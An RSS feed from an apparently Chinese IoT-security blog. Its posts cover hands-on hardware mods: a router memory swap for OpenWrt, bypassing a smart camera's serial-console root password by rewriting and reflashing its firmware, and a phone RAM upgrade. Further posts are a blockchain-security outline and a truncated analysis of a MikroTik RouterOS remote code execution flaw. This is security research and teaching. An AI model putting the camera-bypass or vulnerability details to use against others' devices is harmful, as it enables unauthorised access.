<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Yaseng</title>
  
  <subtitle>Bypass the token</subtitle>
  <link href="/rss.xml" rel="self"/>
  
  <link href="http://yaseng.org/"/>
  <updated>2018-07-09T13:01:10.000Z</updated>
  <id>http://yaseng.org/</id>
  
  <author>
    <name>Yaseng</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>《物联网安全百科》测试版上线</title>
    <link href="http://yaseng.org/iot-security-wiki-beta.html"/>
    <id>http://yaseng.org/iot-security-wiki-beta.html</id>
    <published>2018-06-21T16:00:00.000Z</published>
    <updated>2018-07-09T13:01:10.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="物联网安全百科"><a href="#物联网安全百科" class="headerlink" title="物联网安全百科"></a>物联网安全百科</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本书是由伏宸安全实验发起的一个开源图书项目，目前属于测试版本，很多章节尚未完成，收录在日常研究过程中，总结的零散知识和心得经验，今后会不断完善内容，形成系统化的知识结构。</p><p>当今世界之发展，以大数据、人工智能为基石，网络由虚拟走向现实，连接世间万物，未来即是万物互联之时代，于是传统网络安全的边界亦由虚拟世界扩展到现实社会，诸如喧嚣尘上的智能家居、智能网联车、形形色色的智能芯片硬件，已经渗透进生活中的各个方面，商业窃密、敲诈勒索、钓鱼木马等等传统攻击手段，或将会演变成隐私监控、身份盗窃乃至危及到人身安全的现实攻击，未来安全行业的攻防主战场，是社会中的每一人，要之，安全之重，势如泰山，而安全之道在于攻守，本书亦多以真实攻守为例，略述万物互联时代攻守之思路，不敢传灯授教，但求燃一星火，以待将来。</p><p>至于攻守之道，古来久矣，上窥宇宙方圆之演化，下度红尘万物之百态，大抵皆备攻守之义，攻者，进也，取也，胜也，守者，退也，御也，全也。圣人取之以治天下，所谓不可胜者，守也，可胜者，攻也，守则不足，攻则有余，善守者藏于九地之下，善攻者动于九天之上，故能自保而全胜也。</p><p>某等学力尚浅，此书多有拾人牙慧，恣意妄言者，虽恐见笑于大方，然唯求先进之指教，拳拳之心，不可胜言。</p><h2 id="阅读"><a href="#阅读" class="headerlink" title="阅读"></a>阅读</h2><ul><li>在线阅读：<a href="https://iot-security.wiki" target="_blank" rel="noopener">iot-security.wiki</a>，<a href="">GitBook</a>，<a href="">国内镜像</a></li><li>项目地址：<a href="https://github.com/yaseng/iot-security-wiki" target="_blank" rel="noopener">github.com/yaseng/iot-security-wiki</a></li><li>下载：<a href="">pdf</a>,<a href="">epub</a></li></ul><h2 id="技术交流"><a href="#技术交流" class="headerlink" title="技术交流"></a>技术交流</h2><table><thead><tr><th>名称</th><th>IOT Security Wiki 0.1</th></tr></thead><tbody><tr><td>本书地址</td><td><a href="https://iot-security.wiki" target="_blank" rel="noopener">iot-security.wiki</a></td></tr><tr><td>伏宸安全实验室</td><td><a href="https://future-sec.com" target="_blank" rel="noopener">future-sec.com</a></td></tr><tr><td>IOT Security</td><td><a href="https://iot-security.org" target="_blank" rel="noopener">iot-security.org</a></td></tr><tr><td>Yaseng Blog</td><td><a href="https://yaseng.org">yaseng.org</a></td></tr><tr><td>知乎专栏</td><td><a href="https://zhuanlan.zhihu.com/future-sec" target="_blank" rel="noopener">zhuanlan.zhihu.com</a></td></tr><tr><td>邮箱</td><td>info@iot-security.wiki</td></tr><tr><td>qq 交流群</td><td>306482276</td></tr><tr><td>微信公众号</td><td><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/future-sec-qrcode.jpg" alt=""></td></tr><tr><td>微信交流群</td><td><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/wechat.jpg" alt=""></td></tr></tbody></table><h2 id="参与"><a href="#参与" class="headerlink" title="参与"></a>参与</h2><p>物联网安全随着技术的不断革新，是一个需要持续创新和学习的领域，也是一个涉及多学科、多门类的研究方向，单个的力量终究是有限的，此希望有志于此的读者能跟我们积极分享自己独到的观点和见解，此开源图书项目，编者笔力尚拙，难免多生谬误，希望各位多提宝贵意见和建议，欢迎大家<a href="https://github.com/yaseng/iot-security-wiki" target="_blank" rel="noopener">参与项目</a>。</p><h3 id="修订记录"><a href="#修订记录" class="headerlink" title="修订记录"></a>修订记录</h3><ul><li>2018-6-20  0.1 测试版本 </li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;物联网安全百科&quot;&gt;&lt;a href=&quot;#物联网安全百科&quot; class=&quot;headerlink&quot; title=&quot;物联网安全百科&quot;&gt;&lt;/a&gt;物联网安全百科&lt;/h1&gt;&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前
      
    
    </summary>
    
      <category term="物联网安全" scheme="http://yaseng.org/categories/%E7%89%A9%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="物联网安全" scheme="http://yaseng.org/tags/%E7%89%A9%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8/"/>
    
      <category term="芯片安全" scheme="http://yaseng.org/tags/%E8%8A%AF%E7%89%87%E5%AE%89%E5%85%A8/"/>
    
      <category term="智能硬件安全" scheme="http://yaseng.org/tags/%E6%99%BA%E8%83%BD%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8/"/>
    
      <category term="无线电安全" scheme="http://yaseng.org/tags/%E6%97%A0%E7%BA%BF%E7%94%B5%E5%AE%89%E5%85%A8/"/>
    
      <category term="锁具安全" scheme="http://yaseng.org/tags/%E9%94%81%E5%85%B7%E5%AE%89%E5%85%A8/"/>
    
      <category term="物理安全" scheme="http://yaseng.org/tags/%E7%89%A9%E7%90%86%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>物联网安全硬件修改系列-硬改</title>
    <link href="http://yaseng.org/iot-security-hardware-modification.html"/>
    <id>http://yaseng.org/iot-security-hardware-modification.html</id>
    <published>2018-06-20T16:00:00.000Z</published>
    <updated>2018-06-29T10:39:05.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>硬件层面的修改在现实生活中是相当常见的事情，所谓的硬改、魔改、硬破等等说法，指的就是在硬件层面对设备进行diy功能改造。例如针对传统路由器的硬件架构，替换大容量的内存和闪存芯片，使之能够刷openwrt系统；对某些设备进行配置层的升级，如iPhone，小米等手机内存扩容，使之具有更大容量的存储空间和运行内存； 以及对设备的破解，例如ps,xbox等游戏主机系列的硬破、软破，还有对各种加密录音笔，摄像头，加密U盘和硬盘的破解。<br>研究硬件修改对硬件diy改造，以及厂商在硬件层的安全防护具有非常重要意义。硬件层修改分为硬改和软改两个部分，硬改是对硬件中芯片和电路的改造、替换等，软改是针对芯片固件的修改、重打包等。本节将用具体的几个实例展示如何对设备进行硬改。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/IMG_3234.jpg" alt=""></p><h2 id="硬改路由器刷openwrt"><a href="#硬改路由器刷openwrt" class="headerlink" title="硬改路由器刷openwrt"></a>硬改路由器刷openwrt</h2><h3 id="修改方案"><a href="#修改方案" class="headerlink" title="修改方案"></a>修改方案</h3><p>目前市面上主流的路由器，平时家用功能或许够用，但如果需要一些高级功能，比如屏蔽广告，挂vpn等等又难以实现，而采用openwrt系统可以充分满足定制化和diy的需求，openwrt是一个高度模块化、高度自动化的嵌入式Linux系统，拥有强大的网络组件和扩展性，但如果专门购买openwrt系统的路由器，价格却又不是十分亲民，如果能把传统路由器通过硬件修改，刷入openwrt系统，就是个低成本的解决方案了，本次用来硬改的路由器具体参数如下：品牌：TP-Link， 型号：WR842N，版本：v4.3，采用高通QCA9533的主控，16M的闪存、2M的flash芯片，虽然是老机器，但除了不能外接usb，基本满足需求，当然价格也便宜。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180606_150638.jpg" alt=""></p><p>不得不说TP-Link最近出的机器，硬件缩水越来越严重，新的机器，闪存都集成到了CPU里面，基本没有硬改的空间了。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180613_174407.jpg" alt=""></p><h3 id="更换内存芯片"><a href="#更换内存芯片" class="headerlink" title="更换内存芯片"></a>更换内存芯片</h3><p>openwrt系统最低硬件配置需要32M内存+8M存储芯片，因此需要更换机器上对应的两块芯片，下图红框部分。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180606_15063822.jpg" alt=""></p><p>首先更换内存芯片，换上64M内存芯片，新手的话，建议通过风枪来拆芯片，先用胶带保护一下芯片周围的元件，防止吹飞掉，加点助焊膏，温度稍微高一点。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180606_160529.jpg" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180606_152140.jpg" alt=""></p><p>芯片拆下后，先清洁一下焊盘，用吸锡线去掉焊盘上残余的锡，使焊盘平整，便于对齐芯片引脚。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180606_152132.jpg" alt=""></p><p>清洁完成后，换上64M芯片，注意芯片上的小圆点就是第一脚，需要跟焊盘上的右下角的小圆点对齐，方向不对，芯片就白焊了。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180606_154431.jpg" alt=""></p><p>对齐芯片后，先上一点锡，把芯片固定住，然后涂上助焊剂，为了防止引脚锡粘连，建议助焊膏多放一点，然后采用堆锡法，烙铁头采用弯头，便于拖动焊锡，温度稍高一点，一般无铅锡丝温度在380左右，否则焊锡拖不动，注意锡要适量，否则处理起来比较麻烦，用烙铁头的弯曲处沿着引脚朝一个方向拖动，可能会有剩余的锡处理不掉，可以用吸锡线处理。焊好一侧后，继续用同样的方式焊另一侧，全部焊接完成之后，让芯片自然冷却后，用洗板水或无水酒精清洗干净。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180606_153819.jpg" alt=""></p><p>先通电测试下路由器工作是否正常，如果亮灯不正常，就需要补焊一次。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180606_153823.jpg" alt=""></p><p>确认路由器工作正常，接下来拆下flash芯片，同样用风枪，拆下后，处理一下焊盘。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180606_160657.jpg" alt=""></p><h3 id="刷编程器固件"><a href="#刷编程器固件" class="headerlink" title="刷编程器固件"></a>刷编程器固件</h3><p>在恩山上下载了LEDE17.1的编程器固件，支持WR842N型号路由器，明月固件也可以，然后把bin文件通过编程器刷进芯片中。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180606_161309.jpg" alt=""></p><p>芯片放置在烧录座中，用烧录座连接编程器。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180606_154759.jpg" alt=""></p><p>编程器刷入固件。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180606164128.png" alt=""></p><h3 id="更换闪存芯片"><a href="#更换闪存芯片" class="headerlink" title="更换闪存芯片"></a>更换闪存芯片</h3><p>把烧录完成后的芯片取出，然后焊接上，同样注意引脚的方向，芯片上的小圆点为第一脚，对准焊盘上的第一脚，加点助焊膏。<br>存储芯片引脚间距较大，用烙铁头粘上一点锡，采用点焊法即可焊上。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180606_171616.jpg" alt=""></p><h3 id="硬改完成"><a href="#硬改完成" class="headerlink" title="硬改完成"></a>硬改完成</h3><p>全部焊接完成，把板子清洁一下，重新通电测试，路由器正常，搜索到wifi信号后连接，后台地址：<a href="http://192.168.1.1/" target="_blank" rel="noopener">http://192.168.1.1/</a> 默认用户名和密码；root、root，登录进去，一切正常，说明硬改成功。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180613191402.jpg" alt=""></p><p>openwrt刷好后，需要先修改密码，然后开启一下ssh，就可以用ssh登录管理了，网上很多编译好的安装包，根据自己的需要安装。</p><h2 id="体外分离硬破摄像头"><a href="#体外分离硬破摄像头" class="headerlink" title="体外分离硬破摄像头"></a>体外分离硬破摄像头</h2><h3 id="修改方案-1"><a href="#修改方案-1" class="headerlink" title="修改方案"></a>修改方案</h3><p>在对某品牌智能摄像头进行串口调试时，发现厂商对串口进行了加密，需要输入root密码才能登陆系统。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180614141635.jpg" alt=""></p><p>尝试读取固件中的shadow文件，随即拆掉芯片进行固件读取，飞线读写的成功率不高。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180529_161328.jpg" alt=""></p><p>成功提取固件，找到密码，却暴力破解不了，可行的方案是修改密码然后重新打包固件在刷进芯片中了，改完密码后，重打包在刷进去。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180529_161037.jpg" alt=""></p><p>然而事情并不简单。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/sdfsdfsf5656.jpg" alt=""></p><p>固件修改重刷之后，通电测试发现摄像头并不能启动，排查问题根源在于固件重打包过程出了问题，内部可能也有校验，反复多次试验后，出现了意料之中的事情，因为摄像头较为廉价，PCB做工用料并不是十分优秀，反复拆焊导致焊盘损坏，芯片焊上去出现短路、断路等等问题，绝缘层脱落，采用飞线也无法解决，机器彻底报废，最终出现了如下尸横遍野的结果。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180614_115142.jpg" alt=""></p><h3 id="拆存储芯片"><a href="#拆存储芯片" class="headerlink" title="拆存储芯片"></a>拆存储芯片</h3><p>固件修改重刷是难以一次修改成功的，报废过多，造成太多的浪费，最终想到采用全部焊点飞线到烧录座上，在把芯片放在烧录座上，只要保证焊接不出错，飞线距离够短，就能保证焊盘不受损坏，固件也可以反复烧录测试。<br>首先拆掉芯片，周围同样采用胶带保护一下。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180529_161733.jpg" alt=""></p><h3 id="飞线芯片烧录座"><a href="#飞线芯片烧录座" class="headerlink" title="飞线芯片烧录座"></a>飞线芯片烧录座</h3><p>飞线采用很细的漆包铜线，线长控制在10厘米以内，刮去漆包线头的绝缘层，然后依次飞线焊接，注意焊盘和烧录座引脚的顺序。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180604_161048.jpg" alt=""></p><p>飞线完成后，用热熔胶固定好焊盘和飞线，防止焊点脱落。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180604_162135.jpg" alt=""></p><p>通电测试，发现机器一切正常，说明改造成功。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180604_163009.jpg" alt=""></p><h3 id="烧录固件"><a href="#烧录固件" class="headerlink" title="烧录固件"></a>烧录固件</h3><p>继续修改固件测试，修改的细节在之后固件修改章节会详细说明，<br>因为芯片放在烧录座上，可以轻易的取下重刷，极大的提高了效率，最终成功修改好密码，固件刷录，机器开启正常。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180614133847.jpg" alt=""></p><h3 id="硬破成功"><a href="#硬破成功" class="headerlink" title="硬破成功"></a>硬破成功</h3><p>用修改之后的密码成功登陆进行串口调试，继续更深层次的安全检测，此处调试接口RX、TX焊点已引出，方便接线。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/5b3265e34f0a9.jpg" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/5b3263dc9f57a.jpg" alt=""></p><h2 id="魔改小米5手机加6G内存"><a href="#魔改小米5手机加6G内存" class="headerlink" title="魔改小米5手机加6G内存"></a>魔改小米5手机加6G内存</h2><h3 id="修改方案-2"><a href="#修改方案-2" class="headerlink" title="修改方案"></a>修改方案</h3><p>小米手机一向以性价比著称，但其中的小米5作为2016年的旗舰机，却受到颇多的诟病，核心在于采用的是高通骁龙820的CPU，高配版的内存RAM都只有3G，导致手机运行中不是很流畅，鉴于内存过低，因此准备魔改成6G内存，本次更换的芯片为三星K3RG6G60MM-MGCJ-LPDDR4-6G内存芯片。</p><h3 id="拆机"><a href="#拆机" class="headerlink" title="拆机"></a>拆机</h3><p>说干就干，小米5的话，还是很好拆的一种机型，后盖可以直接打开，然后把螺丝、排线、电池一一取下，主板拿出来即可，注意电池因为背面贴有双面胶，一定不要用蛮力，否则可能损坏底部的排线和屏幕。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180606_193306.jpg" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180606_193313.jpg" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180606_193540.jpg" alt=""></p><p>主板取下后，没有被屏蔽罩保护的就是内存芯片，揭开散热垫，小米5自带的内存芯片型号为:海力士skhynix-H9HKNNNDGUMU-BRNMH-3Gbit-LPD4。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180606_193901.jpg" alt=""></p><h3 id="拆内存芯片"><a href="#拆内存芯片" class="headerlink" title="拆内存芯片"></a>拆内存芯片</h3><p>拆内存芯片要注意保护好周围元器件，贴上高温铝箔纸，涂上焊膏，风枪先给板子预热几秒，然后在距离芯片1厘米左右位置，沿着芯片四周按照同一个方向转动，使芯片均匀受热，防止爆板和爆片。<br>)<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180607_141602.jpg" alt=""></p><p>取下芯片后，清洁焊盘。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180607_143142.jpg" alt=""></p><h3 id="植锡球"><a href="#植锡球" class="headerlink" title="植锡球"></a>植锡球</h3><p>BGA焊接，植锡球是关键，植锡之前，必须把植锡网清洁干净，选用合适的锡球和BGA专用焊膏，先把芯片涂上一层焊膏，涂抹要均匀，注意不要过多，以植锡网覆盖上去后，焊膏不能溢出植锡网孔为准，否则会粘连锡球，选用0.25的无铅低温锡球，把芯片在植锡台上放好，然后盖上植锡网，要对准芯片的焊点，然后盖上固定盖。倒进锡球，稍微晃动一下，使锡球均匀的分布在网孔里，然后倒掉多余锡球，取下植锡网，在用热风枪加热植好锡球的芯片，使锡球固定，注意要缓慢移动风枪，风嘴距离芯片要稍远一点，防止锡球吹飞。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180607_144833.jpg" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180607_145204.jpg" alt=""></p><h3 id="BGA焊接"><a href="#BGA焊接" class="headerlink" title="BGA焊接"></a>BGA焊接</h3><p>先给焊盘均匀的上好一层焊膏，植好锡球的芯片，对准主焊盘，然后放置到BGA返修台上固定好，先100度预热烘干，在执行BGA焊接曲线。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180607_151437.jpg" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180607_151701.jpg" alt=""></p><p>焊接完成后，使板子自然冷却，然后清洗干净。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180607_154349.jpg" alt=""></p><h3 id="魔改完成"><a href="#魔改完成" class="headerlink" title="魔改完成"></a>魔改完成</h3><p>装机，然后开机测试，一切正常，说明魔改成功。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/5b3263dc9f57e.jpg" alt=""></p><h2 id="《物联网安全百科》"><a href="#《物联网安全百科》" class="headerlink" title="《物联网安全百科》"></a>《物联网安全百科》</h2><p>伏宸安全实验室发起的开源图书《物联网安全百科》已经初步上线了，书中记录了实验室最新的一些研究成果和方向，以及物联网安全研究从基础到进阶的一些经验和知识，希望对有志于物联网安全研究者能起到一点的帮助，开源图书项目也希望能够得到大家的支持，一起参与去丰富内容，使之更加完善。<br>图书阅读:<a href="https://iot-security.wiki" target="_blank" rel="noopener">https://iot-security.wiki</a><br>项目地址:<a href="https://github.com/yaseng/iot-security-wiki" target="_blank" rel="noopener">https://github.com/yaseng/iot-security-wiki</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;硬件层面的修改在现实生活中是相当常见的事情，所谓的硬改、魔改、硬破等等说法，指的就是在硬件层面对设备进行diy功能改造。例如针对传统路由器的
      
    
    </summary>
    
      <category term="物联网安全" scheme="http://yaseng.org/categories/%E7%89%A9%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="物联网安全" scheme="http://yaseng.org/tags/%E7%89%A9%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8/"/>
    
      <category term="硬件修改" scheme="http://yaseng.org/tags/%E7%A1%AC%E4%BB%B6%E4%BF%AE%E6%94%B9/"/>
    
      <category term="硬改" scheme="http://yaseng.org/tags/%E7%A1%AC%E6%94%B9/"/>
    
      <category term="硬破" scheme="http://yaseng.org/tags/%E7%A1%AC%E7%A0%B4/"/>
    
      <category term="魔改" scheme="http://yaseng.org/tags/%E9%AD%94%E6%94%B9/"/>
    
  </entry>
  
  <entry>
    <title>浅谈区块链安全</title>
    <link href="http://yaseng.org/talking-about-blockchain-security.html"/>
    <id>http://yaseng.org/talking-about-blockchain-security.html</id>
    <published>2018-04-24T16:00:00.000Z</published>
    <updated>2018-06-29T11:07:57.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>什么是区块链？区块链是分布式数据存储、点对点传输、共识机制、加密算法等计算机技术的新型应用模式。其最重要的特点：去中心化，为人类创造了一个最理想的货币，这是一个近乎完美的P2P网络，去中心化不需要第三方机构的参与，交易双方直接进行交易，这就大大缩短了时间，提高了效率。区块链在金融方面有着颠覆级的改变，在社会生活方面也有着不可想象的影响，区块链技术能使得交易数据完全公开透明，并可以提供完整的信息流，这样我们就可以清楚的看到在这其中是否存在了问题。在诸如：物流环节中保证货品的安全、优化运输路线和日程安排、小企业融资、商品溯源防伪等等方面都具有重要现实意义。</p><p>然而事物在外因的作用下，往往会朝无法预料的方向发展，从而背离初衷，中本聪当年恐怕无法想象自己发明的比特币，会被炒高到如此地步，在资本和利益的驱使下，以区块链之名，无数山寨币如雨后春笋般涌现，在缺乏市场监管和审查机制下，对区块链一无所知的资本家收割走了一波又一波韭菜，本应对社会发展起积极作用的技术，演变成了人们用来对赌的金融工具，人类逐利的本能在这场资本的盛宴中显露无遗。</p><p>区块链技术滥觞于电子货币领域，虽然去中心化的设计，使其具有足够的安全性，但因大量资本家入场，各类代币不受限制的发行，技术和安全意识却没有跟上，在矿力、钱包、交易等方面暴露出了许多安全风险，前段时间的BEC 智能合约爆发的数值溢出漏洞，使其60多亿市值一朝化为乌有，而同样基于ERC20智能合约的电子货币都存在类似的安全风险，而黑客攻击电子货币，非法窃取巨额财富的报道更是不绝于耳，因此区块链的安全问题，是任何一个参与者必须重视的。</p><p>本文只是作为一个门外汉的心态。基于目前的现实环境，对区块链和电子货币安全问题的一点想法，文中可能包含了诸多错误和不当之处，长见笑于大方，仅希望能对整个区块链安全行业做一点微小的贡献，以供同业者参考。</p><h2 id="安全问题"><a href="#安全问题" class="headerlink" title="安全问题"></a>安全问题</h2><h3 id="智能合约"><a href="#智能合约" class="headerlink" title="智能合约"></a>智能合约</h3><h4 id="溢出漏洞"><a href="#溢出漏洞" class="headerlink" title="溢出漏洞"></a>溢出漏洞</h4><h4 id="权限控制不当"><a href="#权限控制不当" class="headerlink" title="权限控制不当"></a>权限控制不当</h4><h4 id="拒绝服务"><a href="#拒绝服务" class="headerlink" title="拒绝服务"></a>拒绝服务</h4><h3 id="交易所"><a href="#交易所" class="headerlink" title="交易所"></a>交易所</h3><h3 id="钱包"><a href="#钱包" class="headerlink" title="钱包"></a>钱包</h3><h3 id="基础设施"><a href="#基础设施" class="headerlink" title="基础设施"></a>基础设施</h3><h3 id="山寨币"><a href="#山寨币" class="headerlink" title="山寨币"></a>山寨币</h3><h3 id="传统安全"><a href="#传统安全" class="headerlink" title="传统安全"></a>传统安全</h3><h2 id="区块链安全思考"><a href="#区块链安全思考" class="headerlink" title="区块链安全思考"></a>区块链安全思考</h2><h3 id="风控"><a href="#风控" class="headerlink" title="风控"></a>风控</h3><p>对异常交易的审计，做风控策略,防止漏洞利用。</p><h3 id="合约自动审计"><a href="#合约自动审计" class="headerlink" title="合约自动审计"></a>合约自动审计</h3><p>自动化的合约审计系统</p><h3 id="威胁情报"><a href="#威胁情报" class="headerlink" title="威胁情报"></a>威胁情报</h3><h3 id="蜜罐"><a href="#蜜罐" class="headerlink" title="蜜罐"></a>蜜罐</h3><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>目前而言，对于整个区块链的安全攻防还处于初级阶段，很多暴露出的问题都只是一些较为初级的安全缺陷，参考其他行业的安全态势发展，这是在正常不过的情形，事物的发展往往都遵循着渐变的过程，在今后对区块链的安全攻防可能会涉及到更底层更核心的深水区，这一过程需要所有的从业者从现在开始引起高度重视，也希望安全行业能够把更多的目光投向区块链，区块链技术是未来技术革新重要方向，希望其能够长足的发展，更好的应用于现实社会中。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li>智能合约逆向  <a href="https://arvanaghi.com/blog/reversing-ethereum-smart-contracts/" target="_blank" rel="noopener">https://arvanaghi.com/blog/reversing-ethereum-smart-contracts/</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;什么是区块链？区块链是分布式数据存储、点对点传输、共识机制、加密算法等计算机技术的新型应用模式。其最重要的特点：去中心化，为人类创造了一个最
      
    
    </summary>
    
      <category term="区块链安全" scheme="http://yaseng.org/categories/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="区块链安全" scheme="http://yaseng.org/tags/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/"/>
    
      <category term="智能合约审计" scheme="http://yaseng.org/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>MikroTik RouterOS &lt; 6.38.4 (x86) 远程代码执行漏洞分析</title>
    <link href="http://yaseng.org/MikroTik-RouterOS-lt-6.38.4-remote-code-execution.html"/>
    <id>http://yaseng.org/MikroTik-RouterOS-lt-6.38.4-remote-code-execution.html</id>
    <published>2018-04-14T16:00:00.000Z</published>
    <updated>2018-06-29T10:32:46.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>《Vault 7》是由维基解密从2017年3月7日开始，发布的一系列文件。其中详细描述了美国中央情报局(Central Intelligence Agency)执行电子监视和网络战的细节活动和能力。Chimay Red是Vault 7中泄漏的CIA Hacking Tools中包含的一个用于exploit运行Router OS的MikroTik(MT) 路由器的一个工具，此工具可用来向MT路由器上传HIVE（Vault7中泄漏出的一个CIA远程控制工具）或者shellcode等payload。Vault7泄露的文档中只包含了<a href="https://wikileaks.org/ciav7p1/cms/page_16384604.html" target="_blank" rel="noopener">工具的使用手册</a>，但此工具并未公开。BigNerd95在github上的<a href="https://github.com/BigNerd95/Chimay-Red" target="_blank" rel="noopener">Chiamy Red项目</a>根据RouterOS的补丁对Chimay Red中使用的漏洞进行了揭露并给出了poc。</p><p>本文主要是对BigNerd95的Chiamy Red项目中使用的 Stack Clash Remote Code Execution漏洞及给出的exp进行细节分析。 环境搭建及使用的漏洞具体可参考<a href="https://github.com/BigNerd95/Chimay-Red/blob/36faf04e9ffb224811e0ac074a62126fdca7a92f/docs/ChimayRed.pdf" target="_blank" rel="noopener">这里</a>。此漏洞存在于RouterOS 6.38.4版本以下，在<a href="https://mikrotik.com/download/changelogs/current-release-tree" target="_blank" rel="noopener">6.38.5版本</a>中被修补。 </p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>从BigNerd95给出的文档中，我们可以知道此漏洞存在于www二进制文件中的Request::readPostData函数中。我们可以使用Chiamy Red项目中的getROSbin.py工具从RouterOS镜像中提取www二进制文件，命令如下：<br><code>$ ./tools/getROSbin.py 6.38.4 x86 /nova/bin/www www_binary</code><br>使用IDA查看Request::readPostData函数 :<img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic5/1.png" alt="1"></p><p>可以看到，该函数先使用Headers::getHeader函数获取content_length字段的值，然后并未对值进行判断就传入了alloca函数，随后使用istream:read函数将content_len_velue长度的数据读取到了当前函数的栈帧中。</p><p>alloca函数具体进行的操作如下图:<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic5/2.png" 